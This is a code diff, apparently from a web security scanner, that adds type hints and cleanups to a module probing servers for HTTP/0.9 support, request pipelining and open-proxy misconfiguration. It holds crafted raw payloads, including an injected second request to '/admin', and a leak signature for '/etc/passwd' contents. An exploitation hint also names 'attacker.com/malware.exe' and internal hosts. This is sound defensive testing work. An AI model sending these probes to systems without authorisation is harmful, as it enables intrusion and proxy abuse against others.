@@ -1,19 +1,25 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
+from __future__ import annotations
+
+import gzip
+import hashlib
 import socket
 import ssl
-import traceback
-import gzip
 import zlib
-import hashlib
+from typing import Any
 
-from utils.utils import requests, configure_logger, urlparse, time, re, sys
 from utils.style import Colors
+from utils.utils import configure_logger, re, requests, time, urlparse
 
 logger = configure_logger(__name__)
 
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except (ImportError, AttributeError):
+    # urllib3 warnings handling may not be available
+    pass
 
 PROXY_PROBE_URL = "http://httpbin.org/get"
 PROXY_PROBE_MARKERS = [
@@ -25,7 +31,7 @@ PROXY_PROBE_MARKERS = [
     "JSON"
 ]
 
-def parse_target(url):
+def parse_target(url: str) -> tuple[str, str | None, int, str]:
     u = urlparse(url)
     scheme = u.scheme or "http"
     host = u.hostname
@@ -35,7 +41,7 @@ def parse_target(url):
     port = u.port or (443 if scheme == "https" else 80)
     return scheme, host, port, path
 
-def detect_http_version_support(url):
+def detect_http_version_support(url: str) -> list[str]:
     try:
         scheme, host, port, path = parse_target(url)
         if scheme != "https":
@@ -57,7 +63,7 @@ def detect_http_version_support(url):
     except Exception:
         return []
 
-def make_tls_socket(host, port, *, force_h1=False, timeout=10):
+def make_tls_socket(host: str | None, port: int, *, force_h1: bool = False, timeout: int = 10) -> ssl.SSLSocket:
     raw = socket.create_connection((host, port), timeout=timeout)
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
@@ -70,7 +76,7 @@ def make_tls_socket(host, port, *, force_h1=False, timeout=10):
     ssock = ctx.wrap_socket(raw, server_hostname=host)
     return ssock
 
-def send_recv(sock, data, read_timeout=10, expect_more=False):
+def send_recv(sock: socket.socket | ssl.SSLSocket, data: bytes | None, read_timeout: int = 10, expect_more: bool = False) -> bytes:
     sock.settimeout(read_timeout)
     if data:
         sock.sendall(data)
@@ -95,7 +101,7 @@ def send_recv(sock, data, read_timeout=10, expect_more=False):
                         if line.lower().startswith(b"content-length:"):
                             try:
                                 content_length = int(line.split(b":")[1].strip())
-                            except:
+                            except Exception:
                                 pass
                             break
                 
@@ -104,7 +110,7 @@ def send_recv(sock, data, read_timeout=10, expect_more=False):
                     if len(buff) - body_start >= content_length:
                         break
                         
-            except socket.timeout:
+            except TimeoutError:
                 break
             except Exception:
                 break
@@ -114,7 +120,7 @@ def send_recv(sock, data, read_timeout=10, expect_more=False):
     
     return buff
 
-def analyze_response_headers(response_data):
+def analyze_response_headers(response_data: bytes) -> dict[str, str | None]:
     try:
         header_end = response_data.find(b"\r\n\r\n")
         if header_end == -1:
@@ -141,14 +147,14 @@ def analyze_response_headers(response_data):
     except Exception:
         return {}
 
-def decompress_if_needed(response_data, url=None):
+def decompress_if_needed(response_data: bytes, url: str | None = None) -> bytes:
     if url:
-        print(f" ├── ALPN Protocol Detection:")
+        print(" ├── ALPN Protocol Detection:")
         alpn_versions = detect_http_version_support(url)
         for ver in alpn_versions:
             print(f" │   └─ {ver}")
         if not alpn_versions:
-            print(f" │   └─ No ALPN protocols detected")
+            print(" │   └─ No ALPN protocols detected")
 
     try:
         header_end = response_data.find(b"\r\n\r\n")
@@ -176,7 +182,7 @@ def decompress_if_needed(response_data, url=None):
     
     return response_data
 
-def first_line_and_code(resp):
+def first_line_and_code(resp: bytes) -> tuple[str, int | None]:
     try:
         line = resp.split(b"\r\n", 1)[0][:200]
         m = re.search(rb"HTTP/\d\.\d\s+(\d+)", line)
@@ -184,7 +190,7 @@ def first_line_and_code(resp):
     except Exception:
         return (resp[:80].decode(errors="replace"), None)
 
-def sanitize_first_line(fl):
+def sanitize_first_line(fl: Any) -> str:
     if not isinstance(fl, str):
         try:
             fl = str(fl)
@@ -197,11 +203,11 @@ def sanitize_first_line(fl):
         return "Binary/Unknown"
     if s.startswith("<"):
         return "Error"
-    return fl
+    return str(fl)
 
 VALID_TOKENS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}
 
-def classify_version_token(v):
+def classify_version_token(v: str) -> list[str]:
     flags = []
     if v == "":
         flags.append("empty_version")
@@ -219,7 +225,7 @@ def classify_version_token(v):
         flags.append("invalid_token")
     return flags
 
-def is_likely_http09_response(response):
+def is_likely_http09_response(response: bytes) -> bool:
     if not response or len(response) == 0:
         return False
     
@@ -240,7 +246,7 @@ def is_likely_http09_response(response):
     
     return False
 
-def probe_http_09(url):
+def probe_http_09(url: str) -> tuple[bool, bytes]:
     scheme, host, port, path = parse_target(url)
     
     tests = [
@@ -253,6 +259,7 @@ def probe_http_09(url):
     
     for i, request_template in enumerate(tests):
         try:
+            s: socket.socket | ssl.SSLSocket
             if scheme == "https":
                 s = make_tls_socket(host, port, force_h1=True, timeout=10)
             else:
@@ -270,7 +277,7 @@ def probe_http_09(url):
             is_09 = is_likely_http09_response(resp)
             results.append((is_09, resp, request_template))
             
-        except Exception as e:
+        except Exception:
             results.append((False, b"", request_template))
     
     positive_results = [r for r in results if r[0]]
@@ -282,7 +289,7 @@ def probe_http_09(url):
     
     return False, b""
 
-def validate_vulnerability_response(response, test_name):
+def validate_vulnerability_response(response: bytes, test_name: str) -> tuple[bool, str]:
     if not response or len(response) < 10:
         return False, "Empty or too short response"
     
@@ -318,9 +325,9 @@ def validate_vulnerability_response(response, test_name):
     
     return len(response) > 50, "Response analysis inconclusive"
 
-def test_http09_misconf(url):
+def test_http09_misconf(url: str) -> dict[str, Any]:
     scheme, host, port, path = parse_target(url)
-    results = {}
+    results: dict[str, Any] = {}
 
     leak_signatures = [
         b"root:x:0:0",
@@ -336,6 +343,7 @@ def test_http09_misconf(url):
 
     try:
         payload = f"GET {path}\n\rHTTP/1.1 200 OK\n\r\n\r".encode()
+        s: socket.socket | ssl.SSLSocket
         if scheme == "https":
             s = make_tls_socket(host, port, force_h1=True, timeout=10)
         else:
@@ -356,12 +364,13 @@ def test_http09_misconf(url):
 
     try:
         payload = f"GET {path}\n\rGET /admin\n\r".encode()
+        s2: socket.socket | ssl.SSLSocket
         if scheme == "https":
-            s = make_tls_socket(host, port, force_h1=True, timeout=10)
+            s2 = make_tls_socket(host, port, force_h1=True, timeout=10)
         else:
-            s = socket.create_connection((host, port), timeout=10)
-        resp_pipeline = send_recv(s, payload, read_timeout=8)
-        s.close()
+            s2 = socket.create_connection((host, port), timeout=10)
+        resp_pipeline = send_recv(s2, payload, read_timeout=8)
+        s2.close()
         
         is_vuln, reason = validate_vulnerability_response(resp_pipeline, "pipeline_possible")
         results["pipeline_possible"] = is_vuln
@@ -383,12 +392,13 @@ def test_http09_misconf(url):
             results["proxy_path_confusion_exploit"] = "Test skipped - probe URL matches target host"
         else:
             payload1 = f"GET {PROXY_PROBE_URL}\r\n\r\n".encode()
+            s3: socket.socket | ssl.SSLSocket
             if scheme == "https":
-                s = make_tls_socket(host, port, force_h1=True, timeout=10)
+                s3 = make_tls_socket(host, port, force_h1=True, timeout=10)
             else:
-                s = socket.create_connection((host, port), timeout=10)
-            resp_proxy = send_recv(s, payload1, read_timeout=8)
-            s.close()
+                s3 = socket.create_connection((host, port), timeout=10)
+            resp_proxy = send_recv(s3, payload1, read_timeout=8)
+            s3.close()
 
             low = resp_proxy[:4096].lower()
             markers = [m.lower().encode() if isinstance(m, str) else m.lower() for m in PROXY_PROBE_MARKERS]
@@ -397,14 +407,15 @@ def test_http09_misconf(url):
             sensitive_url = "http://httpbin.org/status/418"
             payload2 = f"GET {sensitive_url}\r\n\r\n".encode()
             try:
+                s4: socket.socket | ssl.SSLSocket
                 if scheme == "https":
-                    s = make_tls_socket(host, port, force_h1=True, timeout=10)
+                    s4 = make_tls_socket(host, port, force_h1=True, timeout=10)
                 else:
-                    s = socket.create_connection((host, port), timeout=10)
-                resp_sensitive = send_recv(s, payload2, read_timeout=8)
-                s.close()
+                    s4 = socket.create_connection((host, port), timeout=10)
+                resp_sensitive = send_recv(s4, payload2, read_timeout=8)
+                s4.close()
                 is_vuln2 = b"418" in resp_sensitive and b"teapot" in resp_sensitive.lower()
-            except:
+            except Exception:
                 is_vuln2 = False
 
             is_vuln = is_vuln1 or is_vuln2
@@ -413,9 +424,9 @@ def test_http09_misconf(url):
             if is_vuln:
                 exploit_info = []
                 exploit_info.append("EXPLOITATION:")
-                exploit_info.append(f"1. Send: GET http://internal-server/admin")
-                exploit_info.append(f"2. Send: GET http://attacker.com/malware.exe")
-                exploit_info.append(f"3. Send: GET ftp://sensitive-server/config")
+                exploit_info.append("1. Send: GET http://internal-server/admin")
+                exploit_info.append("2. Send: GET http://attacker.com/malware.exe")
+                exploit_info.append("3. Send: GET ftp://sensitive-server/config")
                 exploit_info.append("4. Server acts as open proxy, forwarding requests")
                 exploit_info.append("5. Can bypass firewalls and access internal resources")
                 
@@ -446,7 +457,7 @@ def test_http09_misconf(url):
 
     return results
 
-def probe_weird_versions(url, versions):
+def probe_weird_versions(url: str, versions: list[str]) -> list[dict[str, Any]]:
     scheme, host, port, path = parse_target(url)
     results = []
     
@@ -454,6 +465,7 @@ def probe_weird_versions(url, versions):
         flags = classify_version_token(v)
         req = None
         try:
+            s: socket.socket | ssl.SSLSocket
             if scheme == "https":
                 s = make_tls_socket(host, port, force_h1=True, timeout=10)
             else:
@@ -499,18 +511,20 @@ def probe_weird_versions(url, versions):
             })
     return results
 
-def risk_badge(item):
+def risk_badge(item: dict[str, Any]) -> str:
     flags = set(item.get("flags", []))
     if item.get("accepted") and flags.intersection({"empty_version","leading_space","trailing_space","invalid_token","mixed_case"}):
         return f"{Colors.YELLOW}⚠️{Colors.RESET}"
     return ""
 
-def print_line(v, code, size, extra="", server=""):
+def print_line(v: str, code: int | None, size: int, extra: str = "", server: str = "") -> None:
     code_str = f"{code}" if code is not None else "—"
     server_info = f" ({server[:20]})" if server and server != "Unknown" else ""
-    print(f" ├── {v:<15}: {code_str:<3}{" ":<3}[{size}b]{server_info}{" ":<5}{extra}")
+    spaces3 = " " * 3
+    spaces5 = " " * 5
+    print(f" ├── {v:<15}: {code_str:<3}{spaces3}[{size}b]{server_info}{spaces5}{extra}")
 
-def check_http_version(url: str):
+def check_http_version(url: str) -> None:
     print(f"{Colors.CYAN} ├ Version & protocol analysis{Colors.RESET}")
 
     versions = [
@@ -521,17 +535,14 @@ def check_http_version(url: str):
     ]
 
     try:
-        base = requests.get(url, verify=False, allow_redirects=False, timeout=10)
-        base_ver = getattr(getattr(base, "raw", None), "version", None)
-        ver_map = {10: "HTTP/1.0", 11: "HTTP/1.1", 20: "HTTP/2"}
-        base_ver_str = ver_map.get(base_ver, "HTTP/?")
+        # Test basic HTTP connectivity
+        requests.get(url, verify=False, allow_redirects=False, timeout=10)
     except Exception as e:
         print(f" ├── Base error: {e}")
 
     try:
         is09, sample = probe_http_09(url)
         stat = f"{Colors.GREEN}Support{Colors.RESET}" if is09 else f"{Colors.RED}X{Colors.RESET}"
-        confidence = "High confidence" if is09 else "No support detected"
         print(f" ├── HTTP/0.9: {stat} [{len(sample)} bytes]")
         
         if is09:
